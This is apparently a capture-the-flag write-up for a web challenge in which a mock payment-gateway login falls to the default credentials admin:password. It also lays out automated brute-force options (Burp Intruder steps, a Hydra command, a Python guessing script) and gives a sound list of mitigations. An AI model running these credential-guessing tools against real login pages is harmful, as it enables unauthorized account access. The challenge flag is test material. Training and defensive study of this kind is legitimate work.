# Dictionary Attack

## Challenge Information

| Property | Value |
|----------|-------|
| **Category** | Web |
| **Points** | 100 |
| **Solves** | 58 |
| **Flag Format** | `HPTU{_}` |

## Challenge Description

A FinTech company running a B2B marketplace payment gateway has launched its web application. However, the developers have failed to implement proper authentication protections.

**Objective:** Gain unauthorized access by discovering valid login credentials on the site.

**Known Information:**
- No account lockout after multiple failed attempts
- Username and password follow easy-to-guess patterns
- Authentication mechanism lacks proper protection

---

## Initial Reconnaissance

Upon navigating to the challenge URL, the application presents a login page for **"Razzpay"** - a B2B payment gateway service.

### Observed Features

- Modern login interface with username and password fields
- "Continue" button for form submission
- Marketing elements highlighting "8 Million Businesses" and "100+ Payment Methods"
- Standard POST-based login form

### Initial Analysis

Based on the challenge description, several key points emerge:

- **No lockout mechanism** - unlimited login attempts possible
- **Easy-to-guess patterns** - credentials likely use common/default values
- **Lack of authentication protections** - brute force attacks are viable

---

## Vulnerability Analysis

Testing the login form behavior with different inputs:

### Test Cases

**Test 1:** Random credentials (`test:test123`)
```
Response: "Login failed. Please try again."
```

**Test 2:** Immediate retry with different credentials
```
Response: "Login failed. Please try again."
```

### Key Observations

The testing reveals several critical vulnerabilities:

- **No rate limiting** - multiple attempts allowed without delay
- **No CAPTCHA** - no automated attack prevention
- **No progressive delays** - instant response to each attempt
- **Generic error messages** - no information leakage about username validity
- **No account lockout** - unlimited failed attempts permitted

**Conclusion:** The application is vulnerable to brute force attacks.

---

## Attack Strategy

Given the hints about easy-to-guess patterns, the approach focuses on testing common default credentials before attempting a full dictionary attack.

### Methodology

**Target Username Candidates:**
- `admin`
- `administrator`
- `root`
- `user`

**Target Password Candidates:**
- `password`
- `admin`
- `123456`
- `admin123`

The strategy prioritizes the most common default combinations used in production systems.

---

## Exploitation

### Manual Testing

**Attempt 1:**
```
Username: admin
Password: password
```

**Result:** Successful authentication - redirected to `/success`

The application uses one of the most common default credential combinations, demonstrating a critical security misconfiguration.

---

## Flag Retrieval

After successful authentication, the success page displays the flag:

```
Login Successful
Your flag is: HPTU{Brute_Forc3}
```

**Flag:** `HPTU{Brute_Forc3}`

---

## Alternative Solution: Automated Brute Force

If manual testing had not succeeded immediately, the following automated approaches would be effective:

### Method 1: Burp Suite Intruder

1. **Capture Request:** Use Burp Proxy to intercept the POST request to `/login`
2. **Configure Intruder:**
   - Send captured request to Intruder
   - Mark `username` and `password` parameters as payload positions
3. **Load Wordlists:**
   - Usernames: `SecLists/Usernames/top-usernames-shortlist.txt`
   - Passwords: `SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt`
4. **Attack Configuration:**
   - Attack type: "Cluster Bomb" (tests all combinations)
   - Filter: Look for responses without "Login failed" string
5. **Analysis:** Identify successful authentication by response length or redirect status

### Method 2: Hydra

```bash
hydra -L usernames.txt -P passwords.txt \
  [TARGET_IP]:6001 http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"
```

**Parameters:**
- `-L usernames.txt` - List of usernames to test
- `-P passwords.txt` - List of passwords to test
- `http-post-form` - Specifies HTTP POST method
- Failure string: `Login failed`

### Method 3: Python Script

### Method 3: Python Script

```python
import requests

url = "http://[TARGET]:6001/login"

# Common credentials lists
usernames = ["admin", "administrator", "root", "user"]
passwords = ["password", "admin", "123456", "admin123"]

for user in usernames:
    for pwd in passwords:
        response = requests.post(url, 
            data={"username": user, "password": pwd},
            allow_redirects=False)
        
        if response.status_code == 302:  # Redirect on success
            print(f"[+] FOUND: {user}:{pwd}")
            
            # Follow redirect to get flag
            session = requests.Session()
            session.post(url, data={"username": user, "password": pwd})
            flag_page = session.get(f"http://[TARGET]:6001/success")
            print(flag_page.text)
            break
```

**Script Features:**
- Tests all username/password combinations
- Detects successful login via HTTP 302 redirect
- Automatically retrieves flag from success page
- Minimal dependencies (only requires `requests` library)

---

## Security Analysis

### Vulnerabilities Identified

This challenge exposes multiple critical authentication vulnerabilities:

1. **No Rate Limiting**
   - Unlimited login attempts without delays
   - No progressive slowdown after failures

2. **No Account Lockout Mechanism**
   - Accounts never locked regardless of failed attempts
   - No temporary suspension periods

3. **Weak Default Credentials**
   - Most common credential combination in use (`admin:password`)
   - No forced password change on first login

4. **No CAPTCHA Implementation**
   - No distinction between human and automated requests
   - Brute force attacks easily automated

5. **Lack of Monitoring/Alerting**
   - No detection of brute force patterns
   - No security alerts for multiple failed attempts

### Real-World Impact

For a financial application handling B2B payment gateways, these vulnerabilities could result in:

- **Unauthorized Account Access** - Attackers gain control of business accounts
- **Financial Data Exposure** - Access to sensitive transaction records and financial information
- **Transaction Manipulation** - Ability to modify or redirect payment flows
- **Customer Data Breach** - Exposure of client information and business details
- **Regulatory Violations** - Non-compliance with PCI DSS and financial security standards
- **Reputational Damage** - Loss of customer trust and business credibility

### Recommended Mitigations

**Immediate Actions:**

1. **Implement Rate Limiting**
   - Limit login attempts per IP address (e.g., 10 attempts per 15 minutes)
   - Apply exponential backoff after failed attempts

2. **Account Lockout Policy**
   - Lock accounts after 5 consecutive failed attempts
   - Require admin intervention or time-based unlock (30 minutes)

3. **Enforce Strong Password Policy**
   - Minimum 12 characters with complexity requirements
   - Prohibit common passwords and default credentials
   - Mandatory password changes for default accounts

4. **Add CAPTCHA Protection**
   - Implement CAPTCHA after 3 failed login attempts
   - Use reCAPTCHA v3 for seamless user experience

5. **Multi-Factor Authentication (MFA)**
   - Require MFA for all user accounts
   - Support authenticator apps and hardware tokens

**Long-Term Improvements:**

6. **Security Monitoring**
   - Log all authentication attempts with timestamps and IP addresses
   - Alert administrators on brute force patterns
   - Integrate with SIEM for centralized security monitoring

7. **Web Application Firewall (WAF)**
   - Deploy WAF to detect and block brute force attacks
   - Configure rules for authentication endpoints

8. **Password Management**
   - Implement password complexity validation
   - Check against known breach databases (HaveIBeenPwned API)
   - Enforce regular password rotation policies

---

## Summary

**Challenge:** Dictionary Attack  
**Difficulty:** Easy  
**Time to Solve:** < 2 minutes  
**Tools Used:** Web browser (manual testing)  
**Flag:** `HPTU{Brute_Forc3}`

**Key Learning Points:**
- Always implement rate limiting on authentication endpoints
- Never use default credentials in production environments
- Multi-layered security approach is essential for financial applications
- Proper monitoring and alerting can detect attacks early
